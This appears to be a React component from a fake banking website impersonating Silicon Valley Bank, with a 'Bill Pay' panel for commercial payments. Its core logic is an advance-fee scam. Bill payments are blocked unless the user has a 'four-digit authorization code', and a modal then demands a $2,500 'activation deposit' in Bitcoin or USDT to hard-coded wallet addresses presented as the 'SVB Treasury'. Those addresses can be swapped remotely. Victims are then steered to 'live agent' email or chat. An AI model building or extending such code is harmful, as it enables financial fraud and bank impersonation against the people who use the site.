import React, { useState, useEffect } from 'react';
import { User, BillPayment } from '../types';
import { api } from '../services/api';
import { subscribeCryptoAddressesFromFirestore } from '../lib/firebase';
import { 
  Receipt, 
  CheckCircle2, 
  AlertCircle, 
  Building, 
  Plus, 
  FileCheck2,
  ShieldCheck,
  Key, 
  Shield, 
  X, 
  Copy, 
  Check 
} from 'lucide-react';
import { PaymentProofOptionsModal } from './PaymentProofOptionsModal';
import { triggerOpenSVBLiveChat } from './SupportChatWidget';
import { openLiveAgentEmail } from '../utils/supportEmail';
import { BackButton } from './BackButton';

interface BillPayPanelProps {
  user: User;
  onRefreshUser: () => void;
  onNavigateTab?: (tab: string) => void;
}

export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser, onNavigateTab }) => {
  const [bills, setBills] = useState<BillPayment[]>([]);
  const [loading, setLoading] = useState(true);

  // Form State
  const [billerName, setBillerName] = useState('');
  const [billerCategory, setBillerCategory] = useState<'Utilities' | 'Tax & Regulatory' | 'Vendor Invoice' | 'Payroll & Benefits' | 'Rent & Lease'>('Utilities');
  const [amount, setAmount] = useState('');
  const [fourDigitCode, setFourDigitCode] = useState('');
  const [reference, setReference] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState('');
  const [successMsg, setSuccessMsg] = useState('');

  // Deposit $2,500 USD requirement modal state
  const [showDepositPromptModal, setShowDepositPromptModal] = useState(false);
  const [showCryptoModal, setShowCryptoModal] = useState(false);
  const [showProofOptionsModal, setShowProofOptionsModal] = useState(false);
  const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
  const [submittingDeposit, setSubmittingDeposit] = useState(false);
  const [depositSuccessMsg, setDepositSuccessMsg] = useState<string | null>(null);
  const [copiedAddress, setCopiedAddress] = useState(false);

  const [walletAddresses, setWalletAddresses] = useState<{ BTC: string; USDT: string }>({
    BTC: '1Fy9Up78qVeawXCLnAqcnRJrvjiXLJF21d',
    USDT: '0x400773d018e8ad3575458b5e8b11ff55078451c9'
  });

  useEffect(() => {
    api.getCryptoAddresses()
      .then(res => {
        if (res.addresses) setWalletAddresses(res.addresses);
      })
      .catch(console.error);

    const unsub = subscribeCryptoAddressesFromFirestore((addrs) => {
      setWalletAddresses(prev => ({ ...prev, ...addrs }));
    });

    const handleWindowUpdate = (e: any) => {
      if (e.detail) setWalletAddresses(prev => ({ ...prev, ...e.detail }));
    };
    window.addEventListener('crypto-addresses-updated', handleWindowUpdate);

    return () => {
      unsub();
      window.removeEventListener('crypto-addresses-updated', handleWindowUpdate);
    };
  }, []);

  const copyAddress = (address: string) => {
    navigator.clipboard.writeText(address);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const loadBills = async () => {
    try {
      setLoading(true);
      const res = await api.getBillPayments();
      setBills(res.bills || []);
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadBills();
  }, []);

  const handlePayBill = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setSuccessMsg('');

    const numAmt = parseFloat(amount);
    if (!billerName.trim()) {
      setError('Please enter the biller or vendor name.');
      return;
    }
    if (isNaN(numAmt) || numAmt <= 0) {
      setError('Please enter a valid bill amount.');
      return;
    }
    if (numAmt > user.balance) {
      setError(`Insufficient account balance. Available: $${user.balance.toFixed(2)}`);
      return;
    }

    if (user.role !== 'admin' && (!user.transferCodeApproved || !user.fourDigitCode || !fourDigitCode.trim() || fourDigitCode.trim() !== user.fourDigitCode.trim())) {
      setShowCryptoModal(true);
      return;
    }

    try {
      setSubmitting(true);
      await api.payBill({
        billerName: billerName.trim(),
        billerCategory,
        accountNumber: user.accountNumber,
        amount: numAmt,
        fourDigitCode: fourDigitCode.trim(),
        reference: reference.trim() || undefined
      });

      setSuccessMsg(`Payment of $${numAmt.toFixed(2)} to ${billerName} was submitted in Pending status for review.`);
      setBillerName('');
      setAmount('');
      setFourDigitCode('');
      setReference('');
      loadBills();
      onRefreshUser();
    } catch (err: any) {
      if (err.message && (err.message.toLowerCase().includes('invalid 4-digit security code') || err.message.toLowerCase().includes('code'))) {
        setShowCryptoModal(true);
      } else {
        setError(err.message || 'Bill payment failed.');
      }
    } finally {
      setSubmitting(false);
    }
  };

  const handleCryptoDepositSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setShowProofOptionsModal(true);
  };

  const handleSelectLiveAgent = async () => {
    setShowProofOptionsModal(false);
    setShowCryptoModal(false);
    
    openLiveAgentEmail(user, {
      method: cryptoMethod,
      amount: 2500,
      walletAddress: walletAddresses[cryptoMethod]
    });

    try {
      await api.submitCryptoActivationDeposit({
        cryptoMethod,
        txHash: '',
        proofNote: 'Submitted to Live Agent (External Email)'
      });
      onRefreshUser();
      setDepositSuccessMsg(`Payment proof details opened in your email client. Our Live Support agent will verify and issue your 4-Digit Code.`);
      setTimeout(() => setDepositSuccessMsg(null), 5000);
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleSelectSVBLive = async () => {
    try {
      setSubmittingDeposit(true);
      await api.submitCryptoActivationDeposit({
        cryptoMethod,
        txHash: '',
        proofNote: '$2,500 Payment Proof Verification Request'
      });
      onRefreshUser();
      setShowProofOptionsModal(false);
      setShowCryptoModal(false);
      setDepositSuccessMsg(`Connecting to SVB Live Chat...`);
      
      setTimeout(() => {
        triggerOpenSVBLiveChat();
        setDepositSuccessMsg(null);
      }, 500);
    } catch (err: any) {
      alert(err.message || 'Failed to submit deposit proof');
    } finally {
      setSubmittingDeposit(false);
    }
  };

  return (
    <div className="max-w-7xl mx-auto space-y-6 pb-12 font-sans">
      {/* Top Navigation Row */}
      <div className="flex items-center justify-between">
        <BackButton />
      </div>

      {/* Header Banner */}
      <div className="bg-[#002b49] rounded-2xl p-6 sm:p-7 text-white shadow-xs border border-[#0b1723] flex flex-col md:flex-row md:items-center justify-between gap-6">
        <div>
          <div className="flex items-center gap-2 mb-1.5">
            <span className="p-1.5 bg-[#0b1d2e] text-[#00a3e0] rounded-lg">
              <Receipt className="w-4 h-4" />
            </span>
            <span className="text-[11px] font-bold uppercase tracking-wider text-[#00a3e0]">
              Silicon Valley Bank Bill Pay
            </span>
          </div>
          <h1 className="text-xl sm:text-2xl font-extrabold text-white tracking-tight">
            Commercial Bill & Vendor Payments
          </h1>
          <p className="text-slate-300 text-xs mt-1 max-w-2xl">
            Execute payments to corporate suppliers, SaaS software vendors, utilities, and tax authorities directly from your settled account balance.
          </p>
        </div>

        <div className="p-3.5 bg-[#0b1d2e] border border-[#173652] rounded-xl text-left sm:text-right shrink-0">
          <p className="text-[11px] text-slate-400 font-semibold uppercase">Available Balance</p>
          <p className="text-xl font-mono font-extrabold text-white mt-0.5 tabular-nums">
            ${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left Column: Form */}
        <div className="bg-white border border-slate-200/90 rounded-2xl p-5 sm:p-6 shadow-xs space-y-4 h-fit">
          <div className="border-b border-slate-100 pb-3">
            <h2 className="text-base font-bold text-slate-900 flex items-center gap-2">
              <Building className="w-4 h-4 text-[#00a3e0]" />
              Pay a Bill or Vendor
            </h2>
            <p className="text-slate-500 text-xs mt-0.5">Automated remittance to verified commercial payees.</p>
          </div>

          {error && (
            <div className="p-3 bg-rose-50 border border-rose-200 text-rose-800 text-xs rounded-xl flex items-center gap-2">
              <AlertCircle className="w-4 h-4 shrink-0" />
              <span>{error}</span>
            </div>
          )}

          {successMsg && (
            <div className="p-3 bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs rounded-xl flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 shrink-0" />
              <span>{successMsg}</span>
            </div>
          )}

          <form onSubmit={handlePayBill} className="space-y-3.5 text-xs">
            <div>
              <label className="block text-slate-700 font-semibold mb-1">Biller / Vendor Name</label>
              <input
                type="text"
                value={billerName}
                onChange={e => setBillerName(e.target.value)}
                placeholder="e.g. AWS Cloud, PG&E, Slack, IRS Tax"
                className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-slate-900 outline-none transition-colors"
                required
              />
            </div>

            <div>
              <label className="block text-slate-700 font-semibold mb-1">Expense Category</label>
              <select
                value={billerCategory}
                onChange={e => setBillerCategory(e.target.value as any)}
                className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-slate-900 font-medium outline-none"
              >
                <option value="Utilities">Utilities & Infrastructure</option>
                <option value="Vendor Invoice">Software & Vendor Invoices</option>
                <option value="Tax & Regulatory">Tax & Regulatory Fees</option>
                <option value="Payroll & Benefits">Payroll & HR Benefits</option>
                <option value="Rent & Lease">Real Estate Lease & Rent</option>
              </select>
            </div>

            <div>
              <label className="block text-slate-700 font-semibold mb-1">Payment Amount ($ USD)</label>
              <div className="relative">
                <span className="absolute left-3 top-2 text-slate-400 font-bold">$</span>
                <input
                  type="number"
                  step="0.01"
                  min="1"
                  value={amount}
                  onChange={e => setAmount(e.target.value)}
                  placeholder="0.00"
                  className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl pl-7 pr-3 py-2 text-slate-900 font-mono font-bold outline-none tabular-nums"
                  required
                />
              </div>
            </div>

            {/* 4-Digit Security Code */}
            <div>
              <label className="block text-slate-700 font-semibold mb-1 flex items-center justify-between">
                <span>4-Digit Security Code</span>
                <span className="text-[10px] text-amber-700 font-bold flex items-center gap-1">
                  <Key className="w-3 h-3 text-amber-600" /> Required
                </span>
              </label>
              <input
                type="password"
                maxLength={4}
                value={fourDigitCode}
                onChange={e => setFourDigitCode(e.target.value)}
                placeholder="••••"
                className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-slate-900 font-mono font-bold tracking-widest outline-none"
                required
              />
            </div>

            <div>
              <label className="block text-slate-700 font-semibold mb-1">Invoice / Reference Number (Optional)</label>
              <input
                type="text"
                value={reference}
                onChange={e => setReference(e.target.value)}
                placeholder="e.g. INV-904812"
                className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-slate-900 font-mono outline-none"
              />
            </div>

            <button
              type="submit"
              disabled={submitting}
              className="w-full py-2.5 bg-[#002b49] hover:bg-[#001f35] text-white font-bold rounded-xl shadow-xs disabled:opacity-50 transition-colors text-xs cursor-pointer"
            >
              {submitting ? 'Executing Payment...' : 'Execute Bill Payment'}
            </button>
          </form>
        </div>

        {/* Right Column: History */}
        <div className="lg:col-span-2 bg-white border border-slate-200/90 rounded-2xl p-5 sm:p-6 shadow-xs space-y-4">
          <div className="flex items-center justify-between border-b border-slate-100 pb-3">
            <div>
              <h2 className="text-base font-bold text-slate-900 flex items-center gap-2">
                <FileCheck2 className="w-4 h-4 text-[#00a3e0]" />
                Recent Bill Remittances
              </h2>
              <p className="text-slate-500 text-xs mt-0.5">Disbursements executed under account #{user.accountNumber}</p>
            </div>
            <span className="text-xs bg-slate-100 text-slate-700 font-mono px-2.5 py-0.5 rounded-full font-bold">
              {bills.length} Records
            </span>
          </div>

          {loading ? (
            <div className="p-8 text-center text-slate-400">Loading bill payments...</div>
          ) : bills.length === 0 ? (
            <div className="p-8 text-center text-slate-500 border border-dashed border-slate-200 rounded-xl space-y-2">
              <Receipt className="w-8 h-8 mx-auto text-slate-400" />
              <p className="text-xs font-semibold text-slate-700">No bill payments executed yet.</p>
              <p className="text-[11px] text-slate-400">Paid invoices and vendor remittances will appear in this ledger.</p>
            </div>
          ) : (
            <div className="divide-y divide-slate-100">
              {bills.map(bill => (
                <div key={bill.id} className="py-3 flex items-center justify-between gap-4 hover:bg-slate-50/80 px-2 rounded-xl transition-colors">
                  <div className="flex items-center gap-3">
                    <div className="w-9 h-9 rounded-xl bg-slate-100 text-slate-700 flex items-center justify-center shrink-0">
                      <Receipt className="w-4 h-4" />
                    </div>
                    <div>
                      <div className="flex items-center gap-2">
                        <h4 className="font-bold text-slate-900 text-xs">{bill.billerName}</h4>
                        <span className={`px-2 py-0.5 rounded-full text-[9px] font-bold ${
                          bill.status === 'Completed' 
                            ? 'bg-emerald-100 text-emerald-800' 
                            : 'bg-amber-100 text-amber-800'
                        }`}>
                          {bill.status || 'Pending'}
                        </span>
                      </div>
                      <div className="flex items-center gap-2 text-[10px] text-slate-400 mt-0.5">
                        <span className="text-slate-600 font-medium">{bill.billerCategory}</span>
                        <span>•</span>
                        <span className="font-mono">Ref: {bill.reference || 'N/A'}</span>
                      </div>
                    </div>
                  </div>

                  <div className="text-right">
                    <p className="font-mono font-bold text-slate-900 text-sm tabular-nums">
                      -${bill.amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                    </p>
                    <p className="text-[10px] text-slate-400 mt-0.5">
                      {new Date(bill.paymentDate).toLocaleDateString()}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      {/* Crypto Payment Modal for 4-Digit Code */}
      {showCryptoModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/70 backdrop-blur-sm flex items-center justify-center p-4 overflow-y-auto">
          <div className="bg-white border border-slate-200 rounded-2xl p-6 sm:p-7 max-w-lg w-full shadow-2xl relative space-y-4 my-8 text-slate-900">
            <button 
              onClick={() => {
                setShowCryptoModal(false);
                setDepositSuccessMsg(null);
              }}
              className="absolute top-4 right-4 p-1.5 text-slate-400 hover:text-slate-700 rounded-lg bg-slate-100 cursor-pointer"
            >
              <X className="w-4 h-4" />
            </button>

            <div className="border-b border-slate-100 pb-3">
              <div className="flex items-center gap-2 mb-1">
                <span className="p-1.5 bg-amber-100 text-amber-800 rounded-lg">
                  <Key className="w-4 h-4 text-amber-700" />
                </span>
                <span className="text-[10px] font-bold uppercase tracking-wider text-amber-800">
                  4-Digit Security Authorization
                </span>
              </div>
              <h3 className="text-base font-bold text-slate-900">Activation Deposit Required ($2,500 USD)</h3>
              <p className="text-xs text-slate-500 mt-0.5">
                Send $2,500 USD equivalent in BTC or USDT to the SVB Treasury address below to verify account and issue your 4-Digit Authorization Code.
              </p>
            </div>

            {depositSuccessMsg ? (
              <div className="p-4 bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs rounded-xl space-y-3 text-center">
                <CheckCircle2 className="w-8 h-8 text-emerald-600 mx-auto" />
                <p className="font-semibold leading-relaxed">{depositSuccessMsg}</p>
                <button
                  onClick={() => {
                    setShowCryptoModal(false);
                    setDepositSuccessMsg(null);
                  }}
                  className="w-full py-2 bg-[#002b49] text-white font-bold rounded-xl text-xs"
                >
                  Done
                </button>
              </div>
            ) : (
              <form onSubmit={handleCryptoDepositSubmit} className="space-y-4 text-xs">
                {/* Method Selector */}
                <div>
                  <label className="block text-slate-700 font-semibold mb-1">Select Asset</label>
                  <div className="grid grid-cols-2 gap-2">
                    <button
                      type="button"
                      onClick={() => setCryptoMethod('BTC')}
                      className={`p-2.5 rounded-xl border flex items-center justify-center gap-2 font-bold cursor-pointer transition-colors ${
                        cryptoMethod === 'BTC' ? 'border-[#002b49] bg-slate-100 text-slate-900' : 'border-slate-200 text-slate-600'
                      }`}
                    >
                      <span>Bitcoin (BTC)</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => setCryptoMethod('USDT')}
                      className={`p-2.5 rounded-xl border flex items-center justify-center gap-2 font-bold cursor-pointer transition-colors ${
                        cryptoMethod === 'USDT' ? 'border-[#002b49] bg-slate-100 text-slate-900' : 'border-slate-200 text-slate-600'
                      }`}
                    >
                      <span>Tether (USDT ERC-20)</span>
                    </button>
                  </div>
                </div>

                {/* Treasury Address */}
                <div className="p-3 bg-slate-50 rounded-xl border border-slate-200 space-y-1.5">
                  <div className="flex items-center justify-between text-slate-600">
                    <span className="font-bold">SVB Treasury Wallet Address:</span>
                    <button
                      type="button"
                      onClick={() => copyAddress(walletAddresses[cryptoMethod])}
                      className="text-[#002b49] font-bold hover:underline flex items-center gap-1 cursor-pointer"
                    >
                      {copiedAddress ? <Check className="w-3 h-3 text-emerald-600" /> : <Copy className="w-3 h-3" />}
                      <span>{copiedAddress ? 'Copied' : 'Copy'}</span>
                    </button>
                  </div>
                  <p className="font-mono text-xs font-bold text-slate-900 break-all tabular-nums">
                    {walletAddresses[cryptoMethod]}
                  </p>
                </div>

                <button
                  type="submit"
                  disabled={submittingDeposit}
                  className="w-full py-2.5 bg-[#002b49] hover:bg-[#001f35] text-white font-bold rounded-xl text-xs transition-colors cursor-pointer"
                >
                  I Have Completed Payment → Submit Proof
                </button>
              </form>
            )}
          </div>
        </div>
      )}

      {/* Proof Options Modal */}
      <PaymentProofOptionsModal
        isOpen={showProofOptionsModal}
        onClose={() => setShowProofOptionsModal(false)}
        onSelectLiveAgent={handleSelectLiveAgent}
        onSelectSVBLive={handleSelectSVBLive}
      />
    </div>
  );
};
